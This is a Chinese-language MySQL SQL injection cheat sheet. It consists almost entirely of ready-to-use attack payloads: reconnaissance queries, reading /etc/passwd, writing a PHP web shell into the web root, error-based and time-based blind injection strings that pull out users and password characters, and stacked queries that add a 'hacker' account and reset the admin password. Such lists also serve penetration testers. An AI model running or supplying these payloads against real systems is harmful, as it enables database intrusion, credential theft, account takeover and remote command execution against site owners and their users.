# MySQL 特定语法参考

## 信息收集

```sql
-- 版本
SELECT @@version
SELECT version()

-- 当前用户
SELECT user()
SELECT current_user()

-- 当前数据库
SELECT database()

-- 所有数据库
SELECT schema_name FROM information_schema.schemata

-- 所有表
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- 所有列
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

## 文件操作

```sql
-- 读文件
SELECT LOAD_FILE('/etc/passwd')

-- 写文件
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

## 报错注入

```sql
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## 时间盲注

```sql
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
```

## 堆叠查询

```sql
-- 需要 mysqli_multi_query
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```
